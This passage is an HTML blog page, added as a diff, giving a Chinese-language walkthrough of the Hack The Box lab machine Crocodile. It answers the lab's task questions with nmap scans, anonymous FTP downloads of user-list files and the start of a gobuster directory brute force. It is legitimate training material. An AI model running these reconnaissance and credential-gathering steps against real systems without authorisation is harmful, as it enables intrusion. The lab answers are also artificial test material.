@@ -1,0 +1,1084 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Crocodile About：Crocodile is a very easy Linux machine which showcases the dangers of misconfigured authentication and sensitive data exposure. A vulnerable FTP server instance is misconfigured to allow anonymous authentication and upon enumerating the server, sensitive files can be found containing cleartext credentials. Enumerating and fuzzing the website will reveal a hidden login endpoint where the">
+<title>6. Crocodile</title>
+
+<link rel='canonical' href='https://Sp1ke-sec.github.io/p/6.-crocodile/'>
+
+<link rel="stylesheet" href="/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css"><meta property='og:title' content="6. Crocodile">
+<meta property='og:description' content="Crocodile About：Crocodile is a very easy Linux machine which showcases the dangers of misconfigured authentication and sensitive data exposure. A vulnerable FTP server instance is misconfigured to allow anonymous authentication and upon enumerating the server, sensitive files can be found containing cleartext credentials. Enumerating and fuzzing the website will reveal a hidden login endpoint where the">
+<meta property='og:url' content='https://Sp1ke-sec.github.io/p/6.-crocodile/'>
+<meta property='og:site_name' content='Sp1ke-sec 安全博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-10-31T14:54:14&#43;08:00'/><meta property='article:modified_time' content='2026-10-31T14:54:14&#43;08:00'/><meta property='og:image' content='https://Sp1ke-sec.github.io/p/6.-crocodile/assets/image-20261031140058728.png' />
+<meta name="twitter:title" content="6. Crocodile">
+<meta name="twitter:description" content="Crocodile About：Crocodile is a very easy Linux machine which showcases the dangers of misconfigured authentication and sensitive data exposure. A vulnerable FTP server instance is misconfigured to allow anonymous authentication and upon enumerating the server, sensitive files can be found containing cleartext credentials. Enumerating and fuzzing the website will reveal a hidden login endpoint where the"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://Sp1ke-sec.github.io/p/6.-crocodile/assets/image-20261031140058728.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu1489495842607495246.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🚭</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Sp1ke-sec 安全博客</a></h1>
+            <h2 class="site-description">这里是 Sp1ke-sec</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sp1ke-sec'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#task-1">Task 1</a></li>
+        <li><a href="#task-2">Task 2</a></li>
+        <li><a href="#task-3">Task 3</a></li>
+        <li><a href="#task-4">Task 4</a></li>
+        <li><a href="#task-5">Task 5</a></li>
+        <li><a href="#task-6">Task 6</a></li>
+        <li><a href="#task-7">Task 7</a></li>
+        <li><a href="#task-8">Task 8</a></li>
+        <li><a href="#task-9">Task 9</a></li>
+        <li><a href="#submit-single-flag">Submit Single Flag</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/6.-crocodile/">
+                <img src="/p/6.-crocodile/assets/image-20261031140058728_hu17831393419716477793.png"
+                        srcset="/p/6.-crocodile/assets/image-20261031140058728_hu17831393419716477793.png 800w, /p/6.-crocodile/assets/image-20261031140058728_hu9651324376524886894.png 1600w"
+                        width="800" 
+                        height="333" 
+                        loading="lazy"
+                        alt="Featured image of post 6. Crocodile" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" style="background-color: #2a9d8f; color: #fff;">
+                HTB
+            </a>
+        
+            <a href="/categories/very-easy/" >
+                Very Easy
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/6.-crocodile/">6. Crocodile</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-10-31</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 5 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="crocodile">Crocodile
+</h1><p><img src="/p/6.-crocodile/assets/image-20261031140058728.png"
+	width="466"
+	height="194"
+	srcset="/p/6.-crocodile/assets/image-20261031140058728_hu566921332691198363.png 480w, /p/6.-crocodile/assets/image-20261031140058728_hu3930600233161588243.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261031140058728"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="240"
+		data-flex-basis="576px"
+	
+></p>
+<p>About：Crocodile is a very easy Linux machine which showcases the dangers of misconfigured authentication and sensitive data exposure. A vulnerable FTP server instance is misconfigured to allow anonymous authentication and upon enumerating the server, sensitive files can be found containing cleartext credentials. Enumerating and fuzzing the website will reveal a hidden login endpoint where the previously acquired credentials can be used to gain access to the admin panel.</p>
+<p>介绍：Crocodile 是一个非常简单的 Linux 机器，它展示了身份验证配置错误和敏感数据泄露的危险。存在漏洞的 FTP 服务器实例配置错误，允许匿名身份验证，枚举该服务器后，可以找到包含明文凭据的敏感文件。对网站进行枚举和模糊测试将发现一个隐藏的登录端点，可以使用先前获取的凭据访问管理面板。</p>
+<p>靶机 IP：10.129.1.15</p>
+<h3 id="task-1">Task 1
+</h3><blockquote>
+<p>What Nmap scanning switch employs the use of default scripts during a scan?</p>
+<p>Nmap扫描过程中，哪个扫描开关会使用默认脚本？</p>
+</blockquote>
+<p><code>-sC</code> = <code>--script=default</code> 运行 NSE default 默认脚本集。</p>
+<p>作用是对开放端口执行一批安全、轻量的内置脚本，用于获取 banner、认证信息、目录、基础服务探测等。</p>
+<p><strong>答案：-sC</strong></p>
+<h3 id="task-2">Task 2
+</h3><blockquote>
+<p>What service version is found to be running on port 21?</p>
+<p>在端口 21 上运行的服务版本是什么？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -sV -sC -p <span class="m">21</span> 10.129.1.15      
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-10-31 02:06 -0400
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.1.15 <span class="o">(</span>10.129.1.15<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.23s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   STAT: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span> FTP server status:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Connected to ::ffff:10.10.16.102
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Logged in as ftp
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      TYPE: ASCII
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      No session bandwidth limit
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Session timeout in seconds is <span class="m">300</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Control connection is plain text
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Data connections will be plain text
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      At session startup, client count was <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_End of status
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> -rw-r--r--    <span class="m">1</span> ftp      ftp            <span class="m">33</span> Jun <span class="m">08</span>  <span class="m">2021</span> allowed.userlist
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-rw-r--r--    <span class="m">1</span> ftp      ftp            <span class="m">62</span> Apr <span class="m">20</span>  <span class="m">2021</span> allowed.userlist.passwd
+</span></span><span class="line"><span class="cl">Service Info: OS: Unix
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.54 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：vsftpd 3.0.3</strong></p>
+<h3 id="task-3">Task 3
+</h3><blockquote>
+<p>What FTP code is returned to us for the &ldquo;Anonymous FTP login allowed&rdquo; message?</p>
+<p>对于“允许匿名 FTP 登录”消息，返回给我们的 FTP 代码是什么？</p>
+</blockquote>
+<p>根据 nmap 的扫描结果中有 <code>ftp-anon: Anonymous FTP login allowed (FTP code 230)</code>。</p>
+<p><strong>答案：230</strong></p>
+<h3 id="task-4">Task 4
+</h3><blockquote>
+<p>After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?</p>
+<p>使用 FTP 客户端连接到 FTP 服务器后，当提示匿名登录时，我们应该提供什么用户名？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ftp 10.129.1.15   
+</span></span><span class="line"><span class="cl">Connected to 10.129.1.15.
+</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.129.1.15:root<span class="o">)</span>: anonymous
+</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
+</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
+</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
+</span></span><span class="line"><span class="cl">ftp&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：anonymous</strong></p>
+<h3 id="task-5">Task 5
+</h3><blockquote>
+<p>After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?</p>
+<p>匿名连接到 FTP 服务器后，我们可以使用什么命令下载在 FTP 服务器上找到的文件？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp&gt; ls
+</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>46986<span class="p">|</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
+</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> ftp      ftp            <span class="m">33</span> Jun <span class="m">08</span>  <span class="m">2021</span> allowed.userlist
+</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> ftp      ftp            <span class="m">62</span> Apr <span class="m">20</span>  <span class="m">2021</span> allowed.userlist.passwd
+</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.
+</span></span><span class="line"><span class="cl">ftp&gt; get allowed.userlist
+</span></span><span class="line"><span class="cl">local: allowed.userlist remote: allowed.userlist
+</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>42302<span class="p">|</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> allowed.userlist <span class="o">(</span><span class="m">33</span> bytes<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">100% <span class="p">|</span>*********************************************************<span class="p">|</span>    <span class="m">33</span>      767.29 KiB/s    00:00 ETA
+</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
+</span></span><span class="line"><span class="cl"><span class="m">33</span> bytes received in 00:00 <span class="o">(</span>0.05 KiB/s<span class="o">)</span>
+</span></span><span class="line"><span class="cl">ftp&gt; get allowed.userlist.passwd
+</span></span><span class="line"><span class="cl">local: allowed.userlist.passwd remote: allowed.userlist.passwd
+</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>49321<span class="p">|</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> allowed.userlist.passwd <span class="o">(</span><span class="m">62</span> bytes<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">100% <span class="p">|</span>*********************************************************<span class="p">|</span>    <span class="m">62</span>      946.04 KiB/s    00:00 ETA
+</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
+</span></span><span class="line"><span class="cl"><span class="m">62</span> bytes received in 00:00 <span class="o">(</span>0.23 KiB/s<span class="o">)</span>
+</span></span><span class="line"><span class="cl">ftp&gt; <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="m">221</span> Goodbye.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：get</strong></p>
+<h3 id="task-6">Task 6
+</h3><blockquote>
+<p>What is one of the higher-privilege sounding usernames in &lsquo;allowed.userlist&rsquo; that we download from the FTP server?</p>
+<p>从 FTP 服务器下载的“allowed.userlist”文件中，有哪些用户名听起来权限较高？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# cat allowed.userlist
+</span></span><span class="line"><span class="cl">aron
+</span></span><span class="line"><span class="cl">pwnmeow
+</span></span><span class="line"><span class="cl">egotisticalsw
+</span></span><span class="line"><span class="cl">admin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：admin</strong></p>
+<h3 id="task-7">Task 7
+</h3><blockquote>
+<p>What version of Apache HTTP Server is running on the target host?</p>
+<p>目标主机上运行的是哪个版本的Apache HTTP服务器？</p>
+</blockquote>
+<p>HTTP 服务默认开放在 80 端口。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -sV -sC -p <span class="m">80</span> 10.129.1.15
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-10-31 02:14 -0400
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.1.15 <span class="o">(</span>10.129.1.15<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.30s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Smash - Bootstrap Business Template
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.99 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：Apache httpd 2.4.41</strong></p>
+<h3 id="task-8">Task 8
+</h3><blockquote>
+<p>What switch can we use with Gobuster to specify we are looking for specific filetypes?</p>
+<p>我们可以使用 Gobuster 的哪个开关来指定我们要查找的特定文件类型？</p>
+</blockquote>
+<p><code>-x</code> = <code>--extensions</code>，给字典里的每个词追加文件拓展名（后缀）。只在 <code>dir</code> 目录扫描模式生效。</p>
+<p><strong>答案：-x</strong></p>
+<h3 id="task-9">Task 9
+</h3><blockquote>
+<p>Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?</p>
+<p>我们可以通过目录暴力破解找到哪个 PHP 文件，从而获得对 Web 服务的身份验证机会？</p>
+</blockquote>
+<p>我连接的是 EU 的节点，即使用来代理加速也还是很慢，所以这里 gobuster 扫一万个目录也用了挺长时间的。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# gobuster dir -u http://10.129.1.15 -w /usr/share/wordlists/dirb/common.txt -x <span class="nv">php</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.8.2
